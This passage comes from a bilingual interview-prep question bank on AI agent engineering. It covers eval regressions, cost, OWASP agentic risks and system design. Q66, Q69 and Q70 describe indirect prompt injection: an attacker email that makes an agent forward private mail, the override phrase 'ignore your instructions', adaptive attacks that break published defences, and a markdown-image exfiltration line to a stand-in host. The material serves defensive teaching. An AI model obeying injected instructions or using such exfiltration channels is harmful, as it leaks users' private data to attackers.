- 引用第三方排行榜上的 OSWorld 2.0 分数（有 44%、62%、70%、72% 等多种说法）却不说明版本和测试框架。本题只引项目页数字。
- 把 Gaia2 当成 GAIA 的简单升级。两者测的维度不同：GAIA 是静态问答，Gaia2 是动态异步环境。

**来源：** [GAIA (arXiv 2311.12983)](https://arxiv.org/abs/2311.12983)、[BrowseComp (arXiv 2504.12516)](https://arxiv.org/abs/2504.12516)、[BrowseComp HTML（结果表）](https://arxiv.org/html/2504.12516)、[ARE / Gaia2 (arXiv 2509.17158)](https://arxiv.org/abs/2509.17158)、[Hugging Face: Gaia2 and ARE](https://huggingface.co/blog/gaia2)、[OSWorld 2.0 项目页](https://osworld-v2.xlang.ai/)

---

### Q65 · 你改了 system prompt，离线评测涨了 3 个点，上线后用户投诉反而变多了，怎么排查？ <a id="q65"></a> [↑ 目录](#toc)

**English question:** You changed the system prompt, offline eval went up 3 points, but user complaints increased after launch. How do you investigate?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 回归测试](06-ai-system-design.md#h31) 讲了配对比较、置信区间和"区间跨越阈值（threshold） ≠ 通过"；[06 §2.6](06-ai-system-design.md#s2-6) 讲了评委偏差和线上信号回流；[06 §2.10](06-ai-system-design.md#s2-10) 讲了 trace 和告警。

**答案要点**
1. **先止血（mitigation）。** prompt 是带版本号的配置，用功能开关（feature flag）立刻切回旧版本，或者把新版本的流量降到 5–10% 继续观察。
   - 前提是 prompt 和代码分开发布。prompt 写死在代码里就只能整包回滚（rollback）。
2. **定位：先确认"涨 3 点"是真的。**
   - 看配对差值的置信区间。区间跨越 0，说明 3 点可能只是噪声。
   - 看每个切片（slice：按意图或类别分出的子集）。总分涨了，可能是某个大类涨、某个小类掉。
3. **定位：比较离线集和线上流量的分布。** 把投诉会话分类（答非所问、拒答变多、回复太长、操作错了、语气），和离线集的类别分布对照。
   - 常见情况：离线集是半年前采的，没覆盖新出现的意图（intent）；或者 prompt 是照着 dev 集调的，在 dev 集上过拟合（overfit）了。
4. **根因（root cause）：常见的四类。**
   - ① **评委偏差**：新 prompt 让回答更长、更客气，LLM 评委的冗长偏差把分数推高，用户反而嫌啰嗦。
   - ② **指标不对齐**：离线只测正确性，没测"有没有完成任务""要不要转人工（human handoff）"。
   - ③ **长尾回归（regression）**：新加的规则（比如"必须先确认身份"）在离线集里没出现，线上大量触发，多了一轮来回。
   - ④ **工具调用行为变化**：prompt 改动让模型更少调工具、凭记忆回答。trace 里每次会话的工具调用数会下降。
5. **修复。**
   - 把投诉会话标注后放进回归集（regression set）。
   - 给评委加长度控制，并重新用人工校准。
   - 离线集从最近的生产 trace 分层抽样（stratified sampling）刷新。
   - 改 prompt 时一次只改一处，便于归因。
6. **上线指标。** 用金丝雀（canary）或 A/B 测试，看线上指标：
   - 任务完成率、转人工率、用户重问率（同一问题马上再问一次）、点踩率、平均轮数、每会话成本。
   - 门禁 = 离线不退化 **且** 线上金丝雀在这些指标上不劣于旧版。

**English answer (speakable, ~45–75 s):**
> First I stop the bleeding. Prompts are versioned config behind a flag, so I roll back or drop the new version to a small canary. Then I question the 3 points: is the paired confidence interval clear of zero, and which slices moved? Usually the total hides a drop in one category. Next I classify the complaints and compare them with the offline set's distribution. The usual root causes are a judge rewarding longer answers that users find verbose, an offline metric that checks correctness but not task completion, a new rule that adds an extra turn on a long-tail intent the eval never covered, or the model calling tools less and answering from memory, which shows up as fewer tool calls per trace. The fix is to add the complaint cases to the regression set, recalibrate the judge, refresh the eval set from recent traffic, and gate future prompt changes on an online canary as well.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| How big should the canary be and how long? | 由要检测的最小效应量和流量决定：样本要足够看出转人工率、完成率的差异；至少覆盖一个完整的周内周期 | "Sized to detect the smallest change I care about in escalation or completion rate, and run across a full weekly cycle." |
| How do you prevent this next time? | prompt 走和代码一样的流程：评审、离线门禁、金丝雀、自动回滚条件；评测集每月从生产流量刷新 | "Prompts go through the same pipeline as code: review, offline gate, canary with auto-rollback, and a monthly refresh of the eval set." |

**坑**
- 直接相信离线 +3，不看置信区间和切片。
- 只回滚不复盘，没把投诉样本补进评测集（eval set），下次还会犯。
- 认为"prompt 小改动不用金丝雀"。prompt 改动可能让模型行为整体变化，风险不比代码改动低。

**来源：** [Zheng et al., Judging LLM-as-a-Judge (arXiv 2306.05685)](https://arxiv.org/abs/2306.05685)、[Anthropic: Demystifying evals for AI agents](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)

---

## 模块 L：安全、成本与上线 <a id="ml"></a> [↑ 目录](#toc)

![邮件助手间接注入：致命三要素 vs 拆分读取与动手、代码策略检查、用户确认](notes/images/06d-email-injection.svg)

### Q66 · 什么是间接 prompt 注入？为什么它在 Agent 里比在聊天机器人里危险得多？ <a id="q66"></a> [↑ 目录](#toc)

**English question:** What is indirect prompt injection, and why is it much more dangerous in agents than in chatbots?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 ① 提示注入](06-ai-system-design.md#h32) 讲了攻击样例和五个控制手段，其中能力隔离（isolation）最重要；[05 Agent 安全与可信](notes/05-agent-safety.md) 是零基础版的护栏（guardrails）三关口；[06c Q14](06c-ai-sd-question-bank.md) 讲了替用户执行操作的 agent 怎么防护。

**答案要点**
1. **定义。**
   - **直接注入（direct prompt injection）**：用户自己在对话框里写"忽略之前的指令"。
   - **间接注入（indirect prompt injection）**：攻击者（attacker）把指令藏进 agent **会读到的数据**里，比如网页、邮件、工单（ticket）、PDF、工具返回值、MCP 工具描述（tool description）。攻击者不需要接触对话框。
   - 出处：Greshake 等人 2023 年的论文，在 Bing Chat（GPT-4）和代码补全引擎上演示了这种攻击。
2. **根本原因。** LLM 把指令和数据放在同一个 token 流里处理，**没有可靠的边界**。只要模型读到攻击者写的文字，就有可能把它当指令执行。
3. **为什么在 agent 里更危险。**
   - **有动作**：聊天机器人被骗只是说错话；agent 被骗会发邮件、转账、删文件。
   - **不可信输入多**：agent 会主动浏览网页、读邮箱、调第三方工具，攻击面大得多。
   - **多步链式**：第 3 步读到的注入，可以影响第 10 步的工具调用（tool call），人很难盯住每一步。
   - **自主运行**：后台任务往往没有人实时看着。
4. **"致命三要素"（lethal trifecta，Simon Willison，2025-06）。** 一个系统同时具备以下三点，就能被注入骗去偷数据：
   - ① 能访问私密数据；
   - ② 会接触不可信内容；
   - ③ 能向外通信（发请求、发邮件、渲染外链图片）。
   - 防护的核心是**砍掉其中至少一个**。
5. **防护思路。**
   - 不能指望模型"识别出注入"，见 Q69 的自适应攻击。
   - 要靠架构：能力隔离（读不可信内容的上下文（context）里不挂写工具（write tool））、权限（permission）由服务端（server-side）按用户身份决定、高危动作要用户确认、出站（outbound）数据检查。详见 [06 ① 提示注入](06-ai-system-design.md#h32)。

**English answer (speakable, ~45–75 s):**
> Direct injection is the user typing "ignore your instructions". Indirect injection, named in Greshake and colleagues' 2023 paper, is when an attacker plants instructions in content the model will read later, like a web page, an email, a ticket, or a tool result, without ever touching the chat box. It works because the model processes instructions and data in the same token stream, with no hard boundary. In a chatbot the worst case is a bad answer. In an agent, the injected text can trigger tool calls that send email, move money or leak data, and agents read far more untrusted content, over many steps, often unattended. Simon Willison's lethal trifecta sums it up: private data, untrusted content and an outbound channel together let an attacker steal data. So I design to break at least one of those three, instead of hoping the model spots the attack.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Can't you just tell the model to ignore instructions in data? | 可以作为第二道防线（用分隔符标记数据区），但不是保证；自适应攻击能绕过 | "Delimiters and instructions help as a second layer, but adaptive attacks bypass them, so the real control is architectural." |
| What's an exfiltration channel people forget? | Markdown 图片：模型输出 `![](https://evil/x?d=secret)`，客户端渲染图片时就自动把数据发出去了 | "Markdown images. If the client renders an attacker URL with data in the query string, that's an outbound channel with no tool call at all." |

**坑**
- 只防直接注入，忘了工具返回值和 MCP 工具描述也是不可信输入。
- 认为"用了分类器（classifier）检测注入"就安全了。
- 以为没有"发送"工具就没有外传渠道。渲染的链接、图片和 webhook 都能把数据带出去。

**来源：** [Greshake et al., Not what you've signed up for (arXiv 2302.12173)](https://arxiv.org/abs/2302.12173)、[Simon Willison: The lethal trifecta (2025-06-16)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

---

### Q67 · OWASP Agentic Top 10（2026）列了哪些风险？结合你的项目说说你防了哪几条。 <a id="q67"></a> [↑ 目录](#toc)

**English question:** What risks does the OWASP Top 10 for Agentic Applications 2026 list, and which ones did you mitigate in your own project?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.7](06-ai-system-design.md#s2-7) 的六类护栏（注入、越权（privilege escalation）、PII、写操作（write operation）、失控循环（runaway loop）、输出风险）可以和 OWASP 条目一一对上；项目边界和诚实的缺口见 [06 §4.6](06-ai-system-design.md#s4)、[06 §5.1](06-ai-system-design.md#s5-1)。

**答案要点**
1. **发布信息。** OWASP GenAI Security Project 在 **2025-12-09** 发布《OWASP Top 10 for Agentic Applications for 2026》，由 100 多位业内人士参与、同行评审。
   - 不要和 2026-09 另发的《2026 Top 10 for LLM Applications》混淆，那是另一份清单。
2. **完整清单（以官方发布页为准）。**

| 编号 | 名称 | 白话 |
|---|---|---|
| ASI01 | Agent Goal Hijack（目标劫持） | 读到的内容把 agent 的目标改了，间接注入是主要途径 |
| ASI02 | Tool Misuse（工具滥用） | 用合法工具做破坏性的事 |
| ASI03 | Identity & Privilege Abuse（身份与权限滥用） | 继承的凭证（credentials）或委托链让 agent 越权，包括"代理人困惑"（confused deputy） |
| ASI04 | Agentic Supply Chain Vulnerabilities（供应链） | 第三方模型、工具、MCP server、插件被投毒或被篡改 |
| ASI05 | Unexpected Code Execution（意外代码执行） | 生成的文本变成宿主机上执行的命令 |
| ASI06 | Memory & Context Poisoning（记忆与上下文投毒） | 长期记忆（long-term memory）或 RAG 数据被污染，影响以后的决策 |
| ASI07 | Insecure Inter-Agent Communication（agent 间通信不安全） | agent 之间的消息被伪造或重放（replay） |
| ASI08 | Cascading Failures（级联失败） | 一个错误沿着多个 agent 和工具扩散 |
| ASI09 | Human-Agent Trust Exploitation（利用人对 agent 的信任） | 让人对 agent 的建议照单全收 |
| ASI10 | Rogue Agents（失控 agent） | 治理控制失效后，agent 持续做有害或欺骗性的事 |

3. **结合项目讲（只读（read-only）调查 agent 加 MCP server）。**
   - **ASI02 / ASI05**：server 只暴露查询工具，没有写接口，也不执行生成的代码，被注入也无破坏性工具可调。
   - **ASI01**：工单文本和工具返回都当数据；结论必须引用（cite）实际查到的信号值。
   - **ASI03**：权限由宿主、网关（gateway）、server 强制执行；理想做法是代表用户身份（on-behalf-of）调下游。
   - **ASI04**：锁定 MCP server 和 SDK 版本，只用内部审核过的 server。
   - **ASI08 / ASI10**：步数、token、墙钟上限，加重复调用检测。
4. **主动说缺口（Staff 加分）。** 正式的注入测试集（test set）和回归（regression）门禁是下一步。没做过的条目不要硬套。

**English answer (speakable, ~45–75 s):**
> OWASP's GenAI Security Project published the Agentic Top 10 for 2026 in December 2025. It runs from ASI01 Agent Goal Hijack and ASI02 Tool Misuse, through Identity and Privilege Abuse, Agentic Supply Chain, Unexpected Code Execution, Memory and Context Poisoning, Insecure Inter-Agent Communication and Cascading Failures, to Human-Agent Trust Exploitation and Rogue Agents. In my project, a read-only investigation agent over internal compliance data with an MCP server, the strongest control was simply not exposing write tools or code execution, which covers most of tool misuse and code execution. Ticket text is treated as data, conclusions must cite actual signal values, permissions are enforced by the host, gateway and server rather than the prompt, server versions are pinned, and loops are bounded. The honest gap is a formal injection test suite in the release gate; that's the next thing I'd add.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| How is this different from the LLM Top 10? | LLM Top 10 关注单次模型调用（注入、输出处理等）；Agentic 版关注自主性带来的新风险：工具、身份委托、记忆、多 agent、级联 | "The LLM list is about a single model interaction; the agentic list adds autonomy risks: tools, delegated identity, memory, multi-agent and cascading failures." |
| Which one is hardest to defend? | ASI01 目标劫持：模型层面没有可靠防御，只能靠架构限制"被劫持后能做什么" | "Goal hijack, because there's no reliable model-level fix; you limit what a hijacked agent can do." |

**坑**
- 背错名字或编号，比如把 ASI09 说成 "Trust Exploitation"。以官方页面为准。
- 把 2025-12 发布的 Agentic Top 10 和 2026-09 的 LLM Top 10 当成同一份清单。
- 声称每一条都防住了。只讲真实做过的，并说出缺口。

**来源：** [OWASP: Top 10 for Agentic Applications — The Benchmark for Agentic Security (2025-12-09)](https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/)、[OWASP 资源页](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)、[OWASP: 2026 Top 10 for LLM Applications 公告](https://genai.owasp.org/2026/09/01/owasp-genai-security-project-unveils-2026-top-10-for-llm-applications-new-agent-control-standard-and-sponsors-as-community-tops-30000-members/)

---

### Q68 · Agent 的成本怎么优化？你能说出至少 4 种手段并估算各自的收益吗？ <a id="q68"></a> [↑ 目录](#toc)

**English question:** How do you optimize an agent's cost? Name at least four techniques and estimate the savings of each.
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.9](06-ai-system-design.md#s2-9) 推了 agent 循环（loop）的 token 累加公式（总输入 = n·S + t·n(n+1)/2，随轮数近似平方增长）；[06 模型路由](06-ai-system-design.md#h38)、[06 提示缓存](06-ai-system-design.md#h39)、[06 批处理](06-ai-system-design.md#h41) 讲了各手段的做法。本题补量化估算（estimation）。

**答案要点**

统一假设（沿用 06 §2.9 的示例）：系统前缀（prefix） S = 8k token，每轮新增 t = 2k，共 n = 10 轮。不缓存（cache）时总输入 = 10×8k + 2k×55 = **190k token/任务**（推算）。下面只算输入 token；价格用相对倍数，不写绝对单价。

1. **提示缓存（prompt caching）**：前缀和上次完全相同的部分复用计算结果。Anthropic 官方倍数：5 分钟缓存写入 1.25×，1 小时写入 2×，读取 0.1×（部分新模型更低，如 Opus 5.5 / Sonnet 5.5 是 0.05×）。
   - 只缓存 S：8k×1.25 + 9×8k×0.1 + 110k = 127.2k，**省约 33%**（推算）。
   - 每轮把整段历史都标为缓存（增量缓存）：第 k 轮读 S+(k−1)t（按 0.1×），写新增 t（按 1.25×），合计约 51k，**省约 73%**（推算）。
   - 前提：前缀稳定，不能在开头放时间戳（timestamp）；两次调用间隔小于 TTL。
2. **模型路由（model routing）**：简单请求给小模型（small model）。
   - 假设 60% 请求可交给单价为大模型 1/5 的小模型：成本 = 0.4 + 0.6×0.2 = 0.52，**省约 48%**（推算，比例是假设）。
   - 必须在同一评测集（eval set）上确认，被路由（routing）到小模型的那部分质量没掉。
3. **压缩工具结果（tool result budget）**：只返回需要的字段（投影），设字节上限。
   - t 从 2k 降到 1k：80k + 55k = 135k，**省约 29%**（推算）。
   - 截断（truncation）必须显式标出，不能悄悄丢记录。
4. **工具定义（tool definition）按需加载 / 程序化工具调用。** Anthropic 的数据：
   - 5 个 MCP server 的 58 个工具定义约占 55K token；
   - Tool Search Tool（工具按需搜索加载）减少约 85% 的 token；
   - 程序化工具调用（Programmatic Tool Calling：模型写代码批量调工具，中间结果不进上下文）在复杂研究任务上平均从 43,588 降到 27,297 token，**减 37%**。
5. **批处理 API（Batch API）**：不需要实时的任务（离线评测、夜间摘要（summary））走 batch，Anthropic 官方**便宜 50%**，大多数批次 1 小时内完成。
6. **减少轮数和控制失控**：并行化独立的工具调用；设步数上限和重复调用检测（[06 失控循环](06-ai-system-design.md#h36)）。轮数从 10 降到 6，按公式输入从 190k 降到 6×8k + 2k×21 = 90k（推算）。
7. **顺序**：先量化（按 trace 统计 token 花在哪），再做缓存和截断这类不影响质量的手段，最后才做路由这类有质量风险的手段。

**English answer (speakable, ~45–75 s):**
> I start by measuring where tokens go per trace, because agent input grows roughly quadratically with turns. Then, in order of risk: prompt caching first, since cache reads cost a tenth of the base input price on Anthropic; with a stable prefix and incremental caching of history, my back-of-envelope for a ten-turn task drops input cost by around 70 percent. Second, shrink tool results with field projection and byte budgets; halving per-turn tool output cuts about 30 percent. Third, stop paying for unused tool definitions, either by searching tools on demand or by programmatic tool calling, where Anthropic reports 85 and 37 percent token reductions. Fourth, send offline work like evals to the Batch API at half price. Last, model routing, which can save close to half but carries quality risk, so I verify it on the same eval set, sliced by category.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Why is caching first and routing last? | 缓存不改变模型看到的内容，不影响质量；路由会换掉回答问题的模型，有质量风险，需要评测证明 | "Caching doesn't change what the model sees, so it's quality-neutral; routing changes the model, so it needs eval evidence." |
| What breaks caching in practice? | 前缀里有时间戳、用户 ID；工具列表顺序变化；中途切换模型；两次调用间隔超过 TTL | "Timestamps or user IDs in the prefix, reordered tool lists, switching models mid-session, and gaps longer than the TTL." |

**坑**
- 背绝对价格。价格常变，只说倍数，面试前查官方定价。
- 只算输出 token。agent 的大头是反复重发的输入。
- 帖子说的"58 个工具定义吃掉 5 万多 token"，原文是 58 个工具约 55K token，和帖子量级一致；要注意那是 5 个 MCP server 的组合，不是一个 server。

**来源：** [Anthropic: Prompt caching 文档](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)、[Anthropic: Batch processing 文档](https://platform.claude.com/docs/en/build-with-claude/batch-processing)、[Anthropic: Introducing advanced tool use (2025-11-24)](https://www.anthropic.com/engineering/advanced-tool-use)

---

### Q69 · 学术界提了很多 prompt 注入防御，为什么《The Attacker Moves Second》说它们大多不管用？工程上该怎么办？ <a id="q69"></a> [↑ 目录](#toc)

**English question:** Academia has proposed many prompt injection defenses. Why does "The Attacker Moves Second" argue most of them fail, and what should engineers do instead?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 ① 提示注入](06-ai-system-design.md#h32) 已经主张"能力隔离最重要，分隔符只是第二道防线"。本题补论文证据和系统级设计模式。

**答案要点**
1. **论文。** Nasr、Carlini、Sitawarin 等 14 位作者，arXiv 2510.09023，2025-10-10。
   - 他们攻破了 **12 种**近期的越狱和注入防御，大多数防御的攻击成功率（success rate）**超过 90%**。
   - 这些防御的原论文大多报告接近 0 的攻击成功率。
2. **为什么会这样。** 原论文用**固定的攻击字符串**或**没有针对该防御设计的弱优化攻击**做评估。
   - 真实的攻击者是自适应的（adaptive attacker）：先看到防御，再针对它调整。这就是标题"攻击者后手"的意思。
   - 论文用梯度下降、强化学习（reinforcement learning, RL）、随机搜索和人工红队，加上足够的算力，就把这些防御打穿了。
3. **结论：模型层的防御只能降低成功率，不能当安全边界。** 这包括检测分类器、提示加固、对抗微调（fine-tuning）。
4. **工程上靠架构，让被骗的模型也做不了坏事。**
   - **CaMeL**（Google DeepMind 等，2025-03）：从可信的用户请求生成程序，把**控制流（control flow）**和**数据流**分开。不可信数据**无法改变程序流程**；再用能力标签（capability）在工具调用时检查数据能不能流向这个出口。
     - 在 AgentDojo 基准（benchmark）上，以可证明的安全完成 77% 任务；无防御系统是 84%。
   - **六种设计模式**（Beurer-Kellner 等，2025-06）：
     - 动作选择器（Action-Selector）：模型只能从固定动作里选一个；
     - 先规划后执行（Plan-Then-Execute）：读不可信内容之前就定好计划；
     - LLM Map-Reduce：每份不可信内容由隔离的子调用单独处理；
     - 双 LLM（Dual LLM）：隔离的 LLM 读不可信内容，特权 LLM 只拿到符号引用；
     - 先写代码再执行（Code-Then-Execute）：模型先写出完整程序，再执行；
     - 上下文最小化（Context-Minimization）：把不需要的内容（包括用户原始提示）从后续上下文删掉。
   - 共同思想：**一旦读过不可信内容，就不能再触发有后果的动作**。这对应 Q66 里"砍掉致命三要素中的一个"。
5. **代价。** 这些模式会限制 agent 的通用性（CaMeL 少完成约 7 个百分点的任务）。要按风险分级用：高风险的写操作和出站动作用严格模式，只读问答可以放宽。

**English answer (speakable, ~45–75 s):**
> The paper, by Nasr, Carlini and colleagues in October 2025, took twelve recent defenses that mostly reported near-zero attack success and broke most of them with over 90 percent success. The reason is methodological: the defenses were tested against fixed attack strings or weak attacks not designed for them, while a real attacker moves second, sees the defense and adapts, using gradient search, reinforcement learning or human red-teaming. My conclusion is that classifiers and prompt hardening reduce the rate but aren't a security boundary. The boundary has to be architectural. CaMeL separates control flow from data flow, so untrusted data can't change which tools get called, and it still solved 77 percent of AgentDojo tasks versus 84 undefended. The design-patterns paper gives practical versions: plan-then-execute, dual LLM, action selector, context minimization. The principle is that once untrusted content is in context, it shouldn't be able to trigger consequential actions.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| So are classifiers useless? | 不是。它们降低常见攻击的频率，适合放在输入端做监控和告警；但安全保证要来自权限和数据流控制 | "No. They cut the volume of common attacks and are good telemetry, but the guarantee comes from permissions and data-flow control." |
| How would you evaluate your own defense? | 用自适应红队：给攻击者看完整的防御细节和预算，测禁止动作的成功率；不能只拿公开的注入字符串集测 | "Adaptive red-teaming with full knowledge of the defense, measuring forbidden-action success, not a static list of known strings." |

**坑**
- 说"我们用了某某检测模型，所以防住了注入"。
- 把 CaMeL 说成零代价。它有任务完成率损失，也需要把用户请求写成程序。
- 论文攻破的是 12 种具体防御，不要夸大成"所有防御都无效"。

**来源：** [Nasr et al., The Attacker Moves Second (arXiv 2510.09023)](https://arxiv.org/abs/2510.09023)、[Debenedetti et al., Defeating Prompt Injections by Design / CaMeL (arXiv 2503.18813)](https://arxiv.org/abs/2503.18813)、[Beurer-Kellner et al., Design Patterns for Securing LLM Agents against Prompt Injections (arXiv 2506.08837)](https://arxiv.org/abs/2506.08837)、[Simon Willison 对六种模式的整理](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)

---

### Q70 · 你的邮件助手 Agent 被曝出问题：攻击者发来一封邮件，Agent 读完后把用户的私密邮件转发了出去。你怎么处理？ <a id="q70"></a> [↑ 目录](#toc)

**English question:** Your email assistant agent was exploited: an attacker sent an email, and after reading it the agent forwarded the user's private emails to the attacker. How do you handle it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 ① 提示注入](06-ai-system-design.md#h32)（能力隔离、双上下文、防外传）、[06 ④ 写操作](06-ai-system-design.md#h35)（dry-run → 审批 → 幂等执行）、[06c Q14](06c-ai-sd-question-bank.md)（动作分级、一键停止、审计（audit））。

**答案要点**
1. **先止血（mitigation，分钟级）。**
   - 用开关立刻禁用所有用户的**出站动作**（send / forward / reply），或者把它们全部改为必须用户确认；读和起草功能保留。
   - 撤销或轮换可疑会话（session）的 OAuth 令牌（token）；在邮件网关拦截已知的攻击邮件特征，并把这些邮件隔离。
2. **定位（小时级）。**
   - 用 trace 找出所有"读到外部邮件之后，在同一会话里出现 forward/send 调用"的会话。
   - 对照收件人：是不是用户历史上从没联系过的外部地址。
   - 确定受影响的用户、泄露了哪些邮件，按合规要求通知用户，必要时通知监管方。
3. **根因（root cause）：致命三要素全占了。** agent 能读私密邮箱（私密数据）、会读陌生人发来的邮件（不可信内容）、能直接转发（出站通道）。
   - 而且读取和执行在同一个上下文，转发也不需要用户确认。
   - 这是 OWASP ASI01 目标劫持导致 ASI02 工具滥用。
4. **修复（按强度从高到低）。**
   - ① **隔离读取（双 LLM / quarantined reader）**：读邮件正文的模型没有任何工具，只输出结构化摘要（发件人、意图（intent）、待办），字段经过校验（validation）。持有发送工具的规划（planning）模型看不到原始正文。
   - ② **出站动作由服务端强制用户确认**：确认界面显示收件人、附件和正文的差异。外部新收件人要额外提示；转发的内容必须是用户明确指定的邮件。
   - ③ **收件人和数据流策略**：在代码里检查。比如"邮件 A 的内容只能发给 A 原有的参与人"，这就是 CaMeL 式能力标签的简化版。
   - ④ **堵住隐性外传**：输出里的外部链接和图片不自动渲染，或者经过代理把查询参数去掉。
   - ⑤ 输入端加注入分类器，用来告警（alerting）和监控（monitoring），不作为安全边界。
5. **上线指标。**
   - 注入测试集（含自适应红队样本）上，"未经确认的出站动作"必须为 **0**，这是硬门禁。
   - 线上监控：确认弹窗的拒绝率（用户点拒绝 = 可能的攻击或误解）、新外部收件人的发送量、出站动作的告警数。
   - 复盘后把攻击邮件放进回归集（regression set）。
6. **产品取舍。** 每次都确认会让用户烦。可以按风险分级：发给常用联系人的起草后一键确认；转发到外部新地址必须二次确认。

**English answer (speakable, ~45–75 s):**
> First, stop the bleeding: flip a kill switch that disables send and forward for everyone, or forces confirmation, while keeping read and draft working, and revoke suspicious tokens. Then scope the damage from traces: every session where an external email was read and a forward or send followed to a new external address, and notify affected users. The root cause is the lethal trifecta in one context: private mailbox access, untrusted inbound mail, and an outbound channel with no confirmation. The fix is architectural. A quarantined reader with no tools turns email bodies into validated structured summaries, and the planner that holds send tools never sees raw untrusted text. Outbound actions require server-enforced user confirmation showing recipients and content, with a data-flow rule that content can only go to the original participants unless the user says otherwise. I also block markdown image exfiltration. The release gate is zero unconfirmed outbound actions on an adaptive injection suite.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Won't confirmations kill the UX? | 按风险分级：发给常用联系人的回复一键确认；外部新收件人、带附件、批量转发要二次确认；读和起草不需要确认 | "Tier it: one-tap for replies to known contacts, stronger confirmation for new external recipients or bulk forwards, none for reading and drafting." |
| What if the attacker targets the summary fields? | 摘要用固定 schema 和枚举值，自由文本字段不进入规划模型的指令区；收件人只能来自原邮件参与人或用户明确输入 | "Summaries use a fixed schema and enums; recipients can only come from original participants or explicit user input." |

**坑**
- 第一反应是"改 system prompt，告诉模型别听邮件里的指令"。这既不是止血也不是根因修复。
- 只修转发，忘了回复、起草后自动发送、渲染外链图片这些出站通道。
- 不做影响面评估和用户通知，只修 bug。

**来源：** [Simon Willison: The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)、[Beurer-Kellner et al., Design Patterns for Securing LLM Agents (arXiv 2506.08837)](https://arxiv.org/abs/2506.08837)、[CaMeL (arXiv 2503.18813)](https://arxiv.org/abs/2503.18813)、[OWASP Agentic Top 10 (2025-12-09)](https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/)

---

## 模块 M：项目深挖、系统设计与行为面 <a id="mm"></a> [↑ 目录](#toc)

### Q71 · 设计一个日均 100 万次咨询的电商客服 Agent，要能查订单、改地址、退款，还要能转人工。 <a id="q71"></a> [↑ 目录](#toc)

**English question:** Design an e-commerce customer-service agent handling 1 million conversations a day that can look up orders, change addresses, issue refunds, and hand off to humans.
（难度：实战 · 系统设计 · 题目后半句按截断前文补全）

**现有笔记：** [06c Q2](06c-ai-sd-question-bank.md) 已经给了完整的读写分离、策略引擎、幂等键（idempotency key）、用户确认和转人工（human handoff）设计；[06 ④ 写操作](06-ai-system-design.md#h35)、[06 §2.8](06-ai-system-design.md#s2-8)、[06 §2.9](06-ai-system-design.md#s2-9)。本题在 06c Q2 的基础上补规模估算（estimation）和高并发（concurrency）取舍。

**答案要点**

**1. 澄清问题（问 2–3 个就够）**：可以自动执行哪些操作，退款（refund）上限是多少；用哪些渠道（文字、语音）；目标是什么（自助解决率、平均处理时长、CSAT）。

**2. 规模估算（全部是推算，假设写在括号里）**
- 会话（session）速率：100 万 ÷ 86,400 ≈ 11.6 个/秒；峰值（peak）按 5 倍算（大促时更高）≈ 60 个/秒。
- 并发会话：用利特尔定律（Little's law：并发数 = 到达率 × 平均停留时间），假设每个会话 3 分钟：平均 11.6 × 180 ≈ 2,100，峰值约 10,000。
- LLM 调用：假设每个会话 4 条用户消息，每条约 2 次模型调用（路由加回答，或一次工具循环（tool loop）），每天约 800 万次，峰值约 460 次/秒。
- Token：假设每次调用输入 6k（系统前缀（prefix）加工具定义（tool definition） 3k，加历史和工具结果（tool result）），每天约 480 亿输入 token。
  - 其中约一半是可缓存（cache）的稳定前缀（stable prefix），按 0.1× 计费，所以**前缀缓存是成本的第一杠杆**（见 Q68）。
  - 再加上小模型路由（model routing）。

**3. 组件与数据流**
```
User -> Channel Gateway (auth session, rate limit)
     -> Conversation Service (session state in Redis, durable log in DB)
     -> Intent Router (small model + rules)
          FAQ        -> RAG over policy/help docs (versioned index)
          Read       -> Read Tool Server (orders, shipping) with user's identity
          Action     -> Action Flow:
                          LLM drafts plan -> Policy Engine (code: caps, frequency, risk score)
                          -> User confirms impact summary
                          -> Write Tool Server (separate credentials, idempotency key)
                          -> Post-condition check -> Audit log
          Risky/unclear -> Human Handoff Queue (summary + facts + attempted actions)
     -> Output guard (PII mask, policy promises check) -> User
Traces -> OTel collector -> eval sampling -> regression set
```

**4. 关键取舍**
- **身份来自登录会话，不来自对话内容**：工具只能查当前用户的订单（代表用户身份调用）。
- **模型提议，服务端（server-side）决定**：退款金额和频率上限写在策略引擎的配置里，不写在 prompt 里，见 06c Q2。
- **工作流（workflow）还是自主 agent**：90% 的流量是"查物流、退款进度"这类固定意图（intent），用确定性（deterministic）工作流加小模型（small model）更便宜、更稳。只有复杂的组合问题才进 agent 工具循环。
- **改地址的时间窗**：要查订单是否已发货（前置条件），已发货就转为拦截件或转人工。前置条件由代码检查。
- **转人工**：触发条件包括策略引擎拒绝、用户明确要求、两轮内没解决、情绪激动（分类器（classifier）判断）、高价值订单。交接时附摘要（summary），用户不用重复说。
- **峰值容量**：多家模型供应商（vendor）加故障切换链（[06 故障切换](06-ai-system-design.md#h43)）；按租户（tenant）和渠道排优先级队列（queue）；大促前预留吞吐（throughput）配额。降级（graceful degradation）方案是只回答 FAQ 和查询，暂停自动写操作（write operation），写请求排队（queueing）转人工。
- **评测（evaluation, eval）**：任务完成用 pass^k（Q60）；错误操作率是硬门禁，必须为 0；还要看转人工准确率、CSAT 和每会话成本。新版本先上金丝雀（canary）。

**English answer (speakable, ~45–75 s):**
